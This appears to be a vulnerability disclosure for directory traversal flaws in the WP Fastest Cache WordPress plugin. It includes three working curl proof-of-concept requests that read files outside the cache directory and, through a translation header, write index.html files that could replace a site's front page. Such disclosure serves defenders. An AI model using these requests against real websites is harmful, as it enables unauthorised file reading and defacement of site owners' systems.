__Title__: WordPress WP Fastest Cache 0.8.9.5 Directory Traversal

__Affected Plugin__: [WP Fastest Cache](https://wordpress.org/plugins/wp-fastest-cache/)

__Affected Versions__: <  0.8.9.5 

__CVSS Score__: 9.8 (Critical)


__Active installations__: 1M+

__POC__:-

#1:
The impact is reading files outside of the cache directory. The
attacker has control over the directory only, the file is selected as
the first hit of the scandir results in descending order.

```
curl --path-as-is http://vulnerable-host.tld/wpfc-minified/..\..\..\/stuff.php

<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */
...
```
#2:
The cacheFilePath construction logic in cache.php can be abused to
mount a similar attack as vuln #1 and read index.html files outside
the cache directory:
```
curl --path-as-is http://vulnerable-host.tld/..\..\..\/whatever.html\/..
some html content outside the cache directory
<!-- via php -->
```

#3:
If the Google Translate plugin is active on the victim system then it
is also possible to create index.html files outside the cache
directory:
```
curl -v --header "X-GT-LANG: ../../../.."
http://vulnerable-host.tld/some-article/
```
In configurations where the html extension has higher precedence over
php in the webserver's DirectoryIndex configuration, this could
actually change the front page of the victim website.
